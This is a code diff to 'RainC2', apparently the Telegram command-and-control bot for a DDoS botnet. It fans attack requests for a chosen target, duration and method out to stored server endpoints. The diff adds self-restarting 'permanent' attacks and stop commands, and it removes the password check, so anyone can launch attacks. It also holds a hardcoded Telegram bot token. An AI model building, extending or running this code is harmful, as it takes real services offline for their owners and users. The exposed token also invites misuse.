@@ -11,7 +11,7 @@ const version = '7.0.0';
 const bot = new Telegraf('8219882191:AAHsRc-bQ2nTzn0f5toaI2d86CDd6nej1aI');
 
 let processList = [];
-let authorizedUsers = new Set(); // Store authorized user IDs
+let permanentAttacks = new Map(); // Store permanent attacks
 
 // [========================================] //
 function sleep(ms) {
@@ -62,20 +62,7 @@ function clearUserAgent() {
 }
 
 // [========================================] //
-async function authenticateUser(ctx) {
-    try {
-        const secretBangetJir = await fetch('https://raw.githubusercontent.com/D4youXTool/cache/main/sigma.txt');
-        const password = await secretBangetJir.text();
-        
-        return ctx.message.text.trim() === password.trim();
-    } catch (error) {
-        console.error('Authentication error:', error);
-        return false;
-    }
-}
-
-// [========================================] //
-async function AttackBotnetEndpoints(target, duration, methods, ctx) {
+async function AttackBotnetEndpoints(target, duration, methods, ctx, permanent = false) {
     if (!target || !duration || !methods) {
         return ctx.reply('Example: /attack https://google.com 120 flood');
     }
@@ -88,7 +75,25 @@ async function AttackBotnetEndpoints(target, duration, methods, ctx) {
 
         const startTime = Date.now();
         const endTime = startTime + duration * 1000;
-        processList.push({ target, methods, startTime, duration, endTime, ip: result.query });
+        
+        // Store attack info
+        const attackInfo = { 
+            target, 
+            methods, 
+            startTime, 
+            duration, 
+            endTime, 
+            ip: result.query,
+            permanent: permanent,
+            attackId: `${methods}_${startTime}`
+        };
+        
+        processList.push(attackInfo);
+        
+        // Store permanent attack info
+        if (permanent) {
+            permanentAttacks.set(attackInfo.attackId, attackInfo);
+        }
         
         const now = new Date();
         const options = { month: 'short', day: 'numeric', year: 'numeric', timeZone: 'Asia/Jakarta' };
@@ -99,9 +104,10 @@ async function AttackBotnetEndpoints(target, duration, methods, ctx) {
    Status: ✅ Attack Sent Successfully All Servers
    Host: ${target}
    Port: 443
-   Time: ${duration}s
+   Time: ${duration}s ${permanent ? '(PERMANENT)' : ''}
    Methods: ${methods}
    Sent On: ${formattedDate}
+   Attack ID: ${attackInfo.attackId}
 
 🎯 Target Details
    ASN: ${result.as}
@@ -109,7 +115,7 @@ async function AttackBotnetEndpoints(target, duration, methods, ctx) {
    ORG: ${result.org}
    Country: ${result.country}
 
-⚠️ Note: Not Spam Attack
+⚠️ Note: ${permanent ? 'This is a PERMANENT attack that will restart automatically' : 'Not Spam Attack'}
 `;
         
         await ctx.reply(attackDetails);
@@ -128,7 +134,7 @@ async function AttackBotnetEndpoints(target, duration, methods, ctx) {
 
         // Send requests to each endpoint
         const requests = botnetData.endpoints.map(async (endpoint) => {
-            const apiUrl = `${endpoint}?target=${target}&time=${duration}&methods=${methods}`;
+            const apiUrl = `${endpoint}?target=${target}&time=${duration}&methods=${methods}&permanent=${permanent}`;
 
             try {
                 const response = await axios.get(apiUrl, { timeout });
@@ -147,7 +153,7 @@ async function AttackBotnetEndpoints(target, duration, methods, ctx) {
         botnetData.endpoints = validEndpoints;
         fs.writeFileSync('./lib/botnet.json', JSON.stringify(botnetData, null, 2));
 
-        await ctx.reply(`✅ Attack completed! ${successCount} servers responded successfully.`);
+        await ctx.reply(`✅ Attack completed! ${successCount} servers responded successfully. ${permanent ? 'This attack will restart automatically on all servers.' : ''}`);
 
     } catch (error) {
         await ctx.reply(`❌ Error retrieving target information: ${error.message}`);
@@ -249,20 +255,33 @@ async function monitorOngoingAttacks(ctx) {
         return remaining > 0;
     });
 
-    if (processList.length === 0) {
+    if (processList.length === 0 && permanentAttacks.size === 0) {
         return ctx.reply("📊 No attacks are currently running.");
     }
 
     let attackDetails = `🔄 Running Attacks:\n\n`;
-    attackDetails += `#  │ HOST                    │ SINCE │ DURATION │ METHOD\n`;
-    attackDetails += `───┼─────────────────────────┼───────┼──────────┼────────\n`;
+    attackDetails += `#  │ HOST                    │ SINCE │ DURATION │ METHOD     │ TYPE\n`;
+    attackDetails += `───┼─────────────────────────┼───────┼──────────┼────────────┼───────\n`;
 
+    // Regular attacks
     processList.forEach((process, index) => {
         const host = process.ip || process.target;
         const since = Math.floor((Date.now() - process.startTime) / 1000);
         const duration = `${process.duration}s`;
+        const type = process.permanent ? 'PERM' : 'TEMP';
 
-        attackDetails += `${String(index + 1).padEnd(2)} │ ${host.padEnd(23)} │ ${String(since).padEnd(5)} │ ${duration.padEnd(8)} │ ${process.methods}\n`;
+        attackDetails += `${String(index + 1).padEnd(2)} │ ${host.padEnd(23)} │ ${String(since).padEnd(5)} │ ${duration.padEnd(8)} │ ${process.methods.padEnd(10)} │ ${type}\n`;
+    });
+
+    // Permanent attacks
+    let permIndex = processList.length + 1;
+    permanentAttacks.forEach((attack, attackId) => {
+        const host = attack.ip || attack.target;
+        const since = Math.floor((Date.now() - attack.startTime) / 1000);
+        const duration = `${attack.duration}s`;
+
+        attackDetails += `${String(permIndex).padEnd(2)} │ ${host.padEnd(23)} │ ${String(since).padEnd(5)} │ ${duration.padEnd(8)} │ ${attack.methods.padEnd(10)} │ PERM\n`;
+        permIndex++;
     });
 
     ctx.reply(attackDetails);
@@ -326,28 +345,206 @@ async function subdomen(domain, ctx) {
     }
 }
 
+// PERMANENT ATTACK FUNCTIONS
+async function launchPermanentAttack(target, duration, methods, ctx) {
+    if (!target || !duration || !methods) {
+        return ctx.reply('❌ Example: /permanent https://google.com 120 flood');
+    }
+
+    // Validate duration is reasonable for permanent attacks
+    if (duration < 60) {
+        return ctx.reply('❌ Permanent attacks should have minimum 60s duration for stability.');
+    }
+
+    await AttackBotnetEndpoints(target, duration, methods, ctx, true);
+}
+
+async function listPermanentAttacks(ctx) {
+    if (permanentAttacks.size === 0) {
+        return ctx.reply("📋 No permanent attacks are currently active.");
+    }
+
+    let permDetails = `🔁 Permanent Attacks:\n\n`;
+    permDetails += `ATTACK ID                 │ TARGET           │ DURATION │ METHOD     │ STARTED\n`;
+    permDetails += `──────────────────────────┼──────────────────┼──────────┼────────────┼────────\n`;
+
+    permanentAttacks.forEach((attack, attackId) => {
+        const started = new Date(attack.startTime).toLocaleString();
+        permDetails += `${attackId.padEnd(25)} │ ${attack.target.padEnd(16)} │ ${(attack.duration + 's').padEnd(8)} │ ${attack.methods.padEnd(10)} │ ${started}\n`;
+    });
+
+    ctx.reply(permDetails);
+}
+
+async function removePermanentAttack(attackId, ctx) {
+    if (!attackId) {
+        return ctx.reply('❌ Example: /removeperm <attack_id>');
+    }
+
+    if (!permanentAttacks.has(attackId)) {
+        return ctx.reply(`❌ Permanent attack ${attackId} not found.`);
+    }
+
+    try {
+        // Load botnet data to get endpoints
+        let botnetData;
+        try {
+            botnetData = JSON.parse(fs.readFileSync('./lib/botnet.json', 'utf8'));
+        } catch (error) {
+            botnetData = { endpoints: [] };
+        }
+
+        let removedCount = 0;
+        let totalCount = 0;
+
+        // Send remove-permanent request to each endpoint
+        const requests = botnetData.endpoints.map(async (endpoint) => {
+            const removeUrl = `${endpoint.replace('/RainC2', '/remove-permanent')}?attackId=${attackId}`;
+            totalCount++;
+
+            try {
+                const response = await axios.get(removeUrl, { timeout: 10000 });
+                if (response.data && response.data.message && response.data.message.includes('removed')) {
+                    removedCount++;
+                }
+            } catch (error) {
+                console.error(`Error removing permanent attack at ${endpoint}: ${error.message}`);
+            }
+        });
+
+        await Promise.all(requests);
+
+        // Remove from local permanent attacks
+        permanentAttacks.delete(attackId);
+        
+        // Also remove from process list
+        processList = processList.filter(process => process.attackId !== attackId);
+
+        ctx.reply(`✅ Permanent attack ${attackId} removed! ${removedCount}/${totalCount} servers acknowledged.`);
+        
+    } catch (error) {
+        ctx.reply(`❌ Error removing permanent attack: ${error.message}`);
+    }
+}
+
+// STOP FUNCTIONS
+async function stopSpecificAttack(attackId, ctx) {
+    if (!attackId) {
+        return ctx.reply('❌ Example: /stop <attack_id>');
+    }
+
+    try {
+        // Load botnet data to get endpoints
+        let botnetData;
+        try {
+            botnetData = JSON.parse(fs.readFileSync('./lib/botnet.json', 'utf8'));
+        } catch (error) {
+            botnetData = { endpoints: [] };
+        }
+
+        let stoppedCount = 0;
+        let totalCount = 0;
+
+        // Send stop request to each endpoint
+        const requests = botnetData.endpoints.map(async (endpoint) => {
+            const stopUrl = `${endpoint.replace('/RainC2', '/stop')}?attackId=${attackId}`;
+            totalCount++;
+
+            try {
+                const response = await axios.get(stopUrl, { timeout: 10000 });
+                if (response.data && response.data.message && response.data.message.includes('successfully')) {
+                    stoppedCount++;
+                }
+            } catch (error) {
+                console.error(`Error stopping attack at ${endpoint}: ${error.message}`);
+            }
+        });
+
+        await Promise.all(requests);
+
+        // Remove from local process list and permanent attacks
+        processList = processList.filter(process => process.attackId !== attackId);
+        permanentAttacks.delete(attackId);
+
+        ctx.reply(`✅ Stop command sent! ${stoppedCount}/${totalCount} servers stopped the attack.`);
+        
+    } catch (error) {
+        ctx.reply(`❌ Error stopping attack: ${error.message}`);
+    }
+}
+
+async function stopAllAttacks(ctx) {
+    try {
+        // Load botnet data to get endpoints
+        let botnetData;
+        try {
+            botnetData = JSON.parse(fs.readFileSync('./lib/botnet.json', 'utf8'));
+        } catch (error) {
+            botnetData = { endpoints: [] };
+        }
+
+        let stoppedCount = 0;
+        let totalCount = 0;
+
+        // Send stopall request to each endpoint
+        const requests = botnetData.endpoints.map(async (endpoint) => {
+            const stopAllUrl = `${endpoint.replace('/RainC2', '/stopall')}`;
+            totalCount++;
+
+            try {
+                const response = await axios.get(stopAllUrl, { timeout: 10000 });
+                if (response.data && response.data.stoppedCount !== undefined) {
+                    stoppedCount += response.data.stoppedCount;
+                }
+            } catch (error) {
+                console.error(`Error stopping all attacks at ${endpoint}: ${error.message}`);
+            }
+        });
+
+        await Promise.all(requests);
+
+        // Clear local process lists
+        const localCount = processList.length;
+        const permCount = permanentAttacks.size;
+        processList = [];
+        permanentAttacks.clear();
+
+        ctx.reply(`🛑 All attacks stopped! ${stoppedCount} attacks stopped on servers, ${localCount} local processes and ${permCount} permanent attacks cleared.`);
+        
+    } catch (error) {
+        ctx.reply(`❌ Error stopping all attacks: ${error.message}`);
+    }
+}
+
 // [========================================] //
-// Telegram Bot Commands
+// Telegram Bot Commands - FIXED HELP COMMAND
 // [========================================] //
 
 bot.start(async (ctx) => {
     const welcomeMsg = await banner(ctx);
     ctx.reply(welcomeMsg + '\n\n🤖 RainC2 Telegram Bot is now active!\nUse /help to see available commands.');
+    
+    // Auto-scrape proxy and user-agent on start
+    await scrapeProxy();
+    await scrapeUserAgent();
 });
 
-bot.help((ctx) => {
+// FIXED HELP COMMAND - Explicit command registration
+bot.command('help', (ctx) => {
     const helpText = `
 🤖 *RainC2 Telegram Bot Commands*
 
 📋 *Basic Commands:*
 /start - Start the bot
 /help - Show this help message
-/auth <password> - Authenticate with password
 
 🎯 *Attack Commands:*
 /attack <target> <duration> <method> - Launch DDoS attack
+/permanent <target> <duration> <method> - Launch permanent DDoS attack
 /monitor - Show running attacks
 /methods - Show available methods
+/stop <attack_id> - Stop specific attack
+/stopall - Stop all running attacks
 
 🌐 *Botnet Management:*
 /addvps <endpoint> - Add new server
@@ -360,40 +557,32 @@ bot.help((ctx) => {
 ℹ️ *Info:*
 /credits - Show creator credits
 /news - Show latest news
+/listperm - List permanent attacks
+/removeperm <attack_id> - Remove permanent attack
+
+❓ *Having issues?* Make sure you're using the correct command format.
 `;
     ctx.reply(helpText, { parse_mode: 'Markdown' });
 });
 
-bot.command('auth', async (ctx) => {
-    const password = ctx.message.text.split(' ')[1];
-    if (!password) {
-        return ctx.reply('❌ Please provide password. Usage: /auth <password>');
-    }
-
-    const isValid = await authenticateUser(ctx);
-    if (isValid) {
-        authorizedUsers.add(ctx.from.id);
-        await scrapeProxy();
-        await scrapeUserAgent();
-        ctx.reply('✅ Authentication successful! Bot is now ready to use.');
-    } else {
-        ctx.reply('❌ Wrong password! Access denied.');
-    }
-});
-
 bot.command('attack', (ctx) => {
-    const userId = ctx.from.id;
-    if (!authorizedUsers.has(userId)) {
-        return ctx.reply('❌ Please authenticate first using /auth <password>');
-    }
-
     const args = ctx.message.text.split(' ').slice(1);
     if (args.length < 3) {
         return ctx.reply('❌ Example: /attack https://google.com 120 flood');
     }
 
     const [target, duration, methods] = args;
-    AttackBotnetEndpoints(target, duration, methods, ctx);
+    AttackBotnetEndpoints(target, duration, methods, ctx, false);
+});
+
+bot.command('permanent', (ctx) => {
+    const args = ctx.message.text.split(' ').slice(1);
+    if (args.length < 3) {
+        return ctx.reply('❌ Example: /permanent https://google.com 120 flood');
+    }
+
+    const [target, duration, methods] = args;
+    launchPermanentAttack(target, duration, methods, ctx);
 });
 
 bot.command('methods', (ctx) => {
@@ -401,31 +590,34 @@ bot.command('methods', (ctx) => {
 });
 
 bot.command('addvps', async (ctx) => {
-    const userId = ctx.from.id;
-    if (!authorizedUsers.has(userId)) {
-        return ctx.reply('❌ Please authenticate first using /auth <password>');
-    }
-
     const endpointUrl = ctx.message.text.split(' ')[1];
     processBotnetEndpoint(endpointUrl, ctx);
 });
 
 bot.command('listvps', (ctx) => {
-    const userId = ctx.from.id;
-    if (!authorizedUsers.has(userId)) {
-        return ctx.reply('❌ Please authenticate first using /auth <password>');
-    }
-
     checkBotnetEndpoints(ctx);
 });
 
 bot.command('monitor', (ctx) => {
-    const userId = ctx.from.id;
-    if (!authorizedUsers.has(userId)) {
-        return ctx.reply('❌ Please authenticate first using /auth <password>');
-    }
-
     monitorOngoingAttacks(ctx);
+});
+
+bot.command('listperm', (ctx) => {
+    listPermanentAttacks(ctx);
+});
+
+bot.command('removeperm', (ctx) => {
+    const attackId = ctx.message.text.split(' ')[1];
+    removePermanentAttack(attackId, ctx);
+});
+
+bot.command('stop', (ctx) => {
+    const attackId = ctx.message.text.split(' ')[1];
+    stopSpecificAttack(attackId, ctx);
+});
+
+bot.command('stopall', (ctx) => {
+    stopAllAttacks(ctx);
 });
 
 bot.command('trackip', (ctx) => {
